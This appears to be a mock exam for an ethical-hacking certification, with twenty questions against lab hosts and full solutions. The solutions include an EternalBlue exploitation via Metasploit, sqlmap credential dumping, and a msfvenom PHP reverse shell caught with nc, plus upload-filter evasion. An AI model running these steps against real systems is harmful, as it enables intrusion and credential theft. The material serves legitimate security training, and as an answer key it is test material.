# Mock Exam 1 (Easy) — 20 Questions, 6 Hours

> Sit for 6 hours. No solutions until the end. Mark your answers in a separate text file.
> **Answer format matters — copy verbatim from tool output.**

**Targets in this mock:** `10.10.10.5`, `10.10.10.20`, `10.10.10.40`, `10.10.10.50`, `10.10.10.70`

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

This is the EASY mock — most questions are single-step tool drills. Use it to warm up, calibrate your timing, and confirm your muscle memory on the core tools.

---

## Question 1 (10.10.10.5)
**Domain:** 02 Scanning | **Difficulty:** 🟢 | **Time est:** 3 min

What is the version of the FTP service running on `10.10.10.5`?

**Answer format:** `<software> <version>` (e.g. `vsftpd 2.3.4`)

---

## Question 2 (10.10.10.5)
**Domain:** 02 Scanning | **Difficulty:** 🟢 | **Time est:** 3 min

How many open TCP ports are there on `10.10.10.5` (full 1–65535 range)?

**Answer format:** integer

---

## Question 3 (10.10.10.5)
**Domain:** 03 Enumeration | **Difficulty:** 🟢 | **Time est:** 4 min

Is anonymous FTP login allowed on `10.10.10.5`?

**Answer format:** `Yes` or `No`

---

## Question 4 (10.10.10.5)
**Domain:** 03 Enumeration | **Difficulty:** 🟢 | **Time est:** 4 min

Using the anonymous FTP login, what is the name of the text file available in the root FTP directory?

**Answer format:** filename with extension (e.g. `note.txt`)

---

## Question 5 (10.10.10.20)
**Domain:** 02 Scanning | **Difficulty:** 🟢 | **Time est:** 4 min

What is the OS running on `10.10.10.20`?

**Answer format:** OS name + version (e.g. `Windows 7 Professional`)

---

## Question 6 (10.10.10.20)
**Domain:** 03 Enumeration | **Difficulty:** 🟢 | **Time est:** 5 min

Using SMB enumeration, what is the name of the non-default share on `10.10.10.20`?

**Answer format:** share name (e.g. `Backup`)

---

## Question 7 (10.10.10.20)
**Domain:** 05 System Hacking | **Difficulty:** 🟡 | **Time est:** 10 min

The SMB service on `10.10.10.20` is vulnerable to MS17-010 (EternalBlue). What is the CVE number of this vulnerability?

**Answer format:** `CVE-YYYY-NNNN`

---

## Question 8 (10.10.10.20)
**Domain:** 05 System Hacking | **Difficulty:** 🟡 | **Time est:** 15 min

After exploiting MS17-010 on `10.10.10.20`, read the file `C:\Users\Administrator\Desktop\flag.txt`. What is the flag value?

**Answer format:** flag string verbatim (e.g. `CEH{...}`)

---

## Question 9 (10.10.10.40)
**Domain:** 02 Scanning | **Difficulty:** 🟢 | **Time est:** 3 min

What is the title of the web page served on `10.10.10.40:80`?

**Answer format:** page title verbatim

---

## Question 10 (10.10.10.40)
**Domain:** 12 Web Apps | **Difficulty:** 🟢 | **Time est:** 8 min

Use `gobuster` or `dirb` to find a hidden directory on `http://10.10.10.40/`. What is the name of the directory (excluding standard dirs like `/images`)?

**Answer format:** directory name (e.g. `admin`)

---

## Question 11 (10.10.10.40)
**Domain:** 13 SQL Injection | **Difficulty:** 🟡 | **Time est:** 15 min

The login form at `http://10.10.10.40/admin/login.php` is vulnerable to SQL injection. Using `sqlmap`, what is the name of the database in use?

**Answer format:** database name (e.g. `webapp`)

---

## Question 12 (10.10.10.40)
**Domain:** 13 SQL Injection | **Difficulty:** 🟡 | **Time est:** 10 min

From the same database, dump the `users` table. What is the cleartext password of the user `admin`?

**Answer format:** cleartext password

---

## Question 13 (10.10.10.70)
**Domain:** 07 Sniffing | **Difficulty:** 🟢 | **Time est:** 8 min

A pcap file `capture.pcap` is provided on the desktop. Open it in Wireshark. What is the username transmitted in cleartext during an FTP session?

**Answer format:** username string

---

## Question 14 (10.10.10.70)
**Domain:** 07 Sniffing | **Difficulty:** 🟢 | **Time est:** 5 min

In the same pcap, what is the password for that FTP user?

**Answer format:** password string

---

## Question 15 (general)
**Domain:** 18 Cryptography | **Difficulty:** 🟢 | **Time est:** 5 min

You're given the hash `5f4dcc3b5aa765d61d8327deb882cf99`. Identify the hash type.

**Answer format:** hash type (e.g. `MD5`)

---

## Question 16 (general)
**Domain:** 18 Cryptography | **Difficulty:** 🟡 | **Time est:** 8 min

Crack the hash `5f4dcc3b5aa765d61d8327deb882cf99` using `john` with the `rockyou.txt` wordlist. What is the cleartext?

**Answer format:** cleartext string

---

## Question 17 (image provided)
**Domain:** 18 Cryptography / Steganography | **Difficulty:** 🟡 | **Time est:** 10 min

A JPEG image `secret.jpg` is on your desktop. Use `steghide` with passphrase `password` to extract its hidden content. What is the hidden string?

**Answer format:** string verbatim

---

## Question 18 (10.10.10.50)
**Domain:** 14 Wireless / 07 Sniffing | **Difficulty:** 🟡 | **Time est:** 15 min

A WPA2 pcap `wifi.pcap` is provided. Use `aircrack-ng` with `rockyou.txt` to crack the pre-shared key. The SSID is `HomeWiFi`. What is the WPA passphrase?

**Answer format:** passphrase string

---

## Question 19 (10.10.10.50)
**Domain:** 17 Cloud / 03 Enumeration | **Difficulty:** 🟡 | **Time est:** 10 min

Host `10.10.10.50` is running an S3-compatible storage service on port 9000. Using the AWS CLI or `s3cmd` against `http://10.10.10.50:9000`, list the publicly accessible buckets. What is the name of the public bucket?

**Answer format:** bucket name

---

## Question 20 (10.10.10.40 → 10.10.10.20) — CHAIN
**Domain:** Multi (12 Web Apps → 05 System Hacking) | **Difficulty:** 🟡 | **Time est:** 25 min

A file upload form exists at `http://10.10.10.40/admin/upload.php` (accessible with the admin creds from Q12). Upload a PHP reverse shell with `msfvenom`, catch it with `nc`, then read `/etc/passwd`. How many user accounts have `/bin/bash` as their shell?

**Answer format:** integer

---

---

# Solutions

> Don't read below until you have finished all 20 questions and marked your answers.

---

## Q1 Solution
**Steps:**
1. `nmap -sV -p 21 10.10.10.5` ← [why -sV](../../tools/nmap.md#scan-techniques)
2. Read the `VERSION` column.

**Answer:** `vsftpd 2.3.4`

**Gotcha:** if `filtered`, add `-Pn`. Exact capitalization matters — copy verbatim from nmap output.

---

## Q2 Solution
**Steps:**
1. `nmap -p- -T4 10.10.10.5 -oN ports.txt` ← [why -p-](../../tools/nmap.md#port-specification)
2. `grep -c "^[0-9].*open" ports.txt`

**Answer:** integer (count from output — in a typical easy box with FTP, SSH, HTTP, SMB this is 4)

**Gotcha:** don't just count the default top-1000 scan. The question says all ports.

---

## Q3 Solution
**Steps:**
1. `nmap -p 21 --script ftp-anon 10.10.10.5` ← [NSE scripts](../../tools/nmap.md#nse-scripts-the-money-section)
2. Look for `Anonymous FTP login allowed`.

**Answer:** `Yes`

**Gotcha:** script name is `ftp-anon` not `ftp-anonymous`.

---

## Q4 Solution
**Steps:**
1. `ftp 10.10.10.5`, user `anonymous`, password blank or `anonymous@`.
2. `ls -la`
3. Read filename.

Alternative: `nmap -p 21 --script ftp-anon 10.10.10.5` — the script lists files it sees.

**Answer:** `note.txt` (or whatever the box exposes)

**Gotcha:** use `binary` mode before `get` if you need to download binary files.

---

## Q5 Solution
**Steps:**
1. `sudo nmap -O 10.10.10.20` ← [why -O](../../tools/nmap.md#scan-techniques)
2. Look for the `OS details:` line.
3. If unsure, combine: `sudo nmap -O -sV 10.10.10.20` — service banners often confirm the build.

**Answer:** `Windows 7 Professional SP1` (copy exact string from nmap)

**Gotcha:** needs root (raw socket). If you get no result, add `-Pn --osscan-guess`.

---

## Q6 Solution
**Steps:**
1. `smbclient -L //10.10.10.20/ -N` ← [smbclient](../../tools/smbclient.md)
2. Or: `enum4linux -S 10.10.10.20` ← [enum4linux](../../tools/enum4linux.md)
3. Or: `smbmap -H 10.10.10.20` ← [smbmap](../../tools/smbmap.md)

**Answer:** share name (e.g. `Backup`)

**Gotcha:** ignore default shares `ADMIN$`, `C$`, `IPC$`, `print$`.

---

## Q7 Solution
**Steps:**
1. `nmap -p 445 --script smb-vuln-ms17-010 10.10.10.20` ← [NSE vuln scripts](../../tools/nmap.md#nse-scripts-the-money-section)
2. Or use Metasploit: `use auxiliary/scanner/smb/smb_ms17_010`.
3. Note the CVE in the output.

**Answer:** `CVE-2017-0144`

**Gotcha:** the question may accept `MS17-010` or `EternalBlue` — always note all three.

---

## Q8 Solution
**Steps:**
1. `msfconsole` ← [metasploit](../../tools/metasploit.md)
2. `use exploit/windows/smb/ms17_010_eternalblue`
3. `set RHOSTS 10.10.10.20`
4. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
5. `set LHOST <your-IP>`
6. `exploit`
7. In meterpreter: `cat C:\\Users\\Administrator\\Desktop\\flag.txt`

**Answer:** flag string verbatim (e.g. `CEH{eternalblue_pwned}`)

**Gotcha:** EternalBlue sometimes crashes the box on first shot — if it fails, retry. Also make sure LHOST is the interface facing the target.

---

## Q9 Solution
**Steps:**
1. `nmap -p 80 --script http-title 10.10.10.40`
2. Or simply: `curl -s http://10.10.10.40/ | grep -i '<title>'`
3. Read the `|_http-title:` line.

**Answer:** page title verbatim

**Gotcha:** copy exact case. `Welcome to MyApp` != `welcome to myapp`.

---

## Q10 Solution
**Steps:**
1. `gobuster dir -u http://10.10.10.40/ -w /usr/share/wordlists/dirb/common.txt` ← [gobuster](../../tools/gobuster.md)
2. Or: `dirb http://10.10.10.40/` ← [dirb](../../tools/dirb.md)
3. Or: `ffuf -u http://10.10.10.40/FUZZ -w /usr/share/wordlists/dirb/common.txt` ← [ffuf](../../tools/ffuf.md)
4. Read 200/301 responses, ignore standard dirs.

**Answer:** directory name (e.g. `admin`)

**Gotcha:** don't get stuck on 403s — they exist but aren't "hidden interesting dirs".

---

## Q11 Solution
**Steps:**
1. `sqlmap -u "http://10.10.10.40/admin/login.php" --forms --batch --dbs` ← [sqlmap](../../tools/sqlmap.md)
2. Or capture the POST and feed: `sqlmap -r request.txt --dbs`
3. List of databases printed. Ignore `information_schema`, `mysql`, `sys`, `performance_schema`.

**Answer:** database name (e.g. `webapp`)

**Gotcha:** `--forms` auto-detects form fields. If it fails, use `--data` with a manual POST body.

---

## Q12 Solution
**Steps:**
1. `sqlmap -u "http://10.10.10.40/admin/login.php" --forms --batch -D webapp --tables`
2. `sqlmap -u "http://10.10.10.40/admin/login.php" --forms --batch -D webapp -T users --dump`
3. Find row where `username=admin`.

**Answer:** cleartext password

**Gotcha:** sqlmap will often auto-crack MD5/SHA1 in the dump output. If it shows a hash only, copy it and feed `john` or `hashcat`.

---

## Q13 Solution
**Steps:**
1. Open `capture.pcap` in Wireshark ← [wireshark](../../tools/wireshark.md)
2. Filter: `ftp`
3. Look for `USER <username>` in the info column.
4. Or CLI: `tcpdump -r capture.pcap -A | grep USER` ← [tcpdump](../../tools/tcpdump.md)

**Answer:** username string

**Gotcha:** FTP transmits cleartext — there's always a USER/PASS pair visible.

---

## Q14 Solution
**Steps:**
1. Same pcap, filter: `ftp`
2. Find `PASS <password>`.
3. Or: `tcpdump -r capture.pcap -A | grep PASS`

**Answer:** password string

**Gotcha:** don't confuse with the "Login successful" response. You want the client-sent `PASS`.

---

## Q15 Solution
**Steps:**
1. `hashid 5f4dcc3b5aa765d61d8327deb882cf99` ← [hashid](../../tools/hashid.md)
2. Or visual check: 32 hex chars = MD5 (or NTLM, LM).
3. `hash-identifier` is an alternative.

**Answer:** `MD5`

**Gotcha:** 32 hex = MD5 or NTLM. Context (it's the hash of `password`) rules out NTLM.

---

## Q16 Solution
**Steps:**
1. Save hash to file: `echo 5f4dcc3b5aa765d61d8327deb882cf99 > hash.txt`
2. `john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` ← [john](../../tools/john.md)
3. Or hashcat: `hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt` ← [hashcat](../../tools/hashcat.md)
4. `john --show hash.txt`

**Answer:** `password`

**Gotcha:** if john returns nothing immediately, it may already have cracked it — always follow with `--show`.

---

## Q17 Solution
**Steps:**
1. `steghide extract -sf secret.jpg -p password` ← [steghide](../../tools/steghide.md)
2. This drops a file (often `secret.txt`) in cwd.
3. `cat secret.txt`

**Answer:** string verbatim

**Gotcha:** if passphrase is empty, press Enter — don't type the word "empty".

---

## Q18 Solution
**Steps:**
1. `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> wifi.pcap` ← [aircrack-ng](../../tools/aircrack-ng.md)
2. Find BSSID first: `aircrack-ng wifi.pcap` (lists networks).
3. Wait for KEY FOUND.

**Answer:** passphrase string

**Gotcha:** the pcap must contain a full 4-way handshake. If aircrack says "No valid WPA handshakes found", the pcap is incomplete.

---

## Q19 Solution
**Steps:**
1. `aws --endpoint-url http://10.10.10.50:9000 s3 ls --no-sign-request`
2. Or: `s3cmd --host=10.10.10.50:9000 --no-ssl ls`
3. Read bucket listing.

**Answer:** bucket name

**Gotcha:** `--no-sign-request` is the key for anonymous access. Without it, awscli demands credentials.

---

## Q20 Solution — CHAIN
**Steps:**
1. **Craft payload:** `msfvenom -p php/reverse_php LHOST=<your-IP> LPORT=4444 -f raw > shell.php` ← [msfvenom](../../tools/msfvenom.md)
2. **Start listener:** `nc -lvnp 4444`
3. **Log into admin:** use creds from Q12 at `http://10.10.10.40/admin/login.php`.
4. **Upload `shell.php`** via the upload form.
5. **Trigger it:** `curl http://10.10.10.40/uploads/shell.php` (path may be `/admin/uploads/`).
6. **In the reverse shell:** `cat /etc/passwd | grep -c /bin/bash`

**Answer:** integer

**Gotcha:** 
- If the upload form filters extensions, try `shell.phtml`, `shell.php5`, or double extensions like `shell.jpg.php`.
- If nc catches nothing, your LHOST is wrong or the target can't reach you — verify with `ping` from the shell.
- Count lines with `grep -c`, not `wc -l` on the full passwd file.

---

## End of Mock 1

**Expected score for ready candidates:** 16–20 / 20

**Expected completion time:** 3h30–4h30 (this mock is deliberately under-length so you bank confidence).

When done, debrief per the process in [`README.md`](README.md), then move on to [`mock-2.md`](mock-2.md).
